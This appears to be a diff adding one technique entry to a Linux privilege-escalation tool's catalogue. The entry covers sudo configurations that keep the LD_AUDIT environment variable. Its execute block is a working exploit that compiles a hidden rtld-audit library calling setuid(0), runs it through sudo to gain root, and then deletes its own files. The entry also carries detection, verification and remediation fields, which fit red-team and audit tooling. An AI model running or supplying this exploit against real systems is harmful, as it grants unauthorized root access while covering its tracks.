@@ -1,0 +1,36 @@
+# sudo env_keep=LD_AUDIT variant — less-known cousin of LD_PRELOAD
+technique: T1574.006
+name: sudo env_keep=LD_AUDIT → root via rtld-audit
+key: sudo:env-audit-keep
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: config-change
+  detection: quiet
+detect:
+  sudo_env_keep_any:
+    - LD_AUDIT
+execute:
+  command: |-
+    cat > /tmp/.aud.c <<'C'
+    #include <stdio.h>
+    #include <unistd.h>
+    unsigned int la_version(unsigned int v){ setgid(0); setuid(0); system("id"); return v; }
+    C
+    gcc -fPIC -shared -o /tmp/.aud.so /tmp/.aud.c 2>/dev/null
+    sudo LD_AUDIT=/tmp/.aud.so id 2>/dev/null; rm -f /tmp/.aud.c /tmp/.aud.so
+verify:
+  success: "uid=0"
+cleanup:
+  command: "rm -f /tmp/.aud.c /tmp/.aud.so"
+report:
+  vector_type: sudo_env_audit
+  evidence: "sudo Defaults env_keep contains LD_AUDIT"
+  description: >
+    LD_AUDIT lets glibc's rtld-audit interface load an attacker library
+    with la_version() running before main(). Same practical effect as
+    LD_PRELOAD but often missed when admins harden env_keep.
+  remediation: >
+    Strip LD_AUDIT alongside LD_PRELOAD / LD_LIBRARY_PATH from env_keep.
+  refs: [T1574.006]
